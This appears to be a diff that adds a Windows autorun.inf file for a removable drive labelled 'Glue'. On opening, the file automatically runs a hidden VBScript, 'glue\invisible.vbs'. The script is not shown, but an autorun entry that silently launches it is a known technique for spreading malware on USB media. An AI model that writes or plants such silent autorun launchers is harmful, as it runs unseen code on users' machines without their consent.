@@ -1,0 +1,4 @@
+[autorun] 
+open=glue\invisible.vbs
+icon=glue\glue.ico
+label=Glue
